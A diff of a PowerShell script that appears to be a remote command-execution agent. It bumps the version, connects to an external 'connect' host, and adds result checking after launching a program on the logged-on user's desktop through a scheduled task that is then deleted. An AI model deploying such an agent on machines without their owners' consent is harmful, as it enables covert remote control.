@@ -2,7 +2,7 @@
 # ║  CONFIGURATION                                                             ║
 # ║  Edit these values to match your setup. All features reference these vars. ║
 # ╚══════════════════════════════════════════════════════════════════════════════╝
-$Version = "2.6.0"
+$Version = "2.7.0"
 $cfHost = "https://connect.aniketpandey.website"
 $maxRetries = 10
 $cmdTimeout = 300   # default timeout — use 'notimeout:' prefix or 'cancel' for manual control
@@ -565,11 +565,27 @@ function Invoke-CommandStreaming {
 
             Register-ScheduledTask -TaskName $taskId -Action $guiAction -Principal $guiPrincipal -Settings $guiSettings -Force | Out-Null
             Start-ScheduledTask -TaskName $taskId
-            Start-Sleep -Seconds 2
+            Start-Sleep -Seconds 3
+
+            # Check if task ran successfully before cleanup
+            $taskInfo = Get-ScheduledTaskInfo -TaskName $taskId -ErrorAction SilentlyContinue
+            $taskState = (Get-ScheduledTask -TaskName $taskId -ErrorAction SilentlyContinue).State
+            $lastResult = if ($taskInfo) { $taskInfo.LastTaskResult } else { -1 }
+
             Unregister-ScheduledTask -TaskName $taskId -Confirm:$false -ErrorAction SilentlyContinue
 
-            Send-Result-To-Server -Body "[+] GUI launched on $loggedOnUser's desktop: $guiCmd (cwd: $guiCwd)`n"
-            Write-Log "GUI launched: $guiCmd as $loggedOnUser" "INFO"
+            if ($lastResult -eq 0 -or $taskState -eq "Running") {
+                Send-Result-To-Server -Body "[+] GUI launched on $loggedOnUser's desktop: $guiCmd`n    Exe: $guiExe | CWD: $guiCwd`n"
+                Write-Log "GUI launched: $guiCmd as $loggedOnUser" "INFO"
+            } elseif ($lastResult -eq 267011) {
+                # 0x41303 = task has not yet run (just started, still running)
+                Send-Result-To-Server -Body "[+] GUI launched on $loggedOnUser's desktop: $guiCmd`n    Exe: $guiExe | CWD: $guiCwd`n"
+                Write-Log "GUI launched: $guiCmd as $loggedOnUser" "INFO"
+            } else {
+                $hexResult = "0x{0:X}" -f $lastResult
+                Send-Result-To-Server -Body "[!] GUI may have failed (exit code: $lastResult / $hexResult)`n    Command: $guiCmd`n    Resolved exe: $guiExe`n    CWD: $guiCwd`n    User: $loggedOnUser`n"
+                Write-Log "GUI launch may have failed: $guiCmd (result=$lastResult)" "WARN"
+            }
         } catch {
             Send-Result-To-Server -Body "[!] GUI launch failed: $($_.Exception.Message)`n"
             Write-Log "GUI launch error: $($_.Exception.Message)" "WARN"
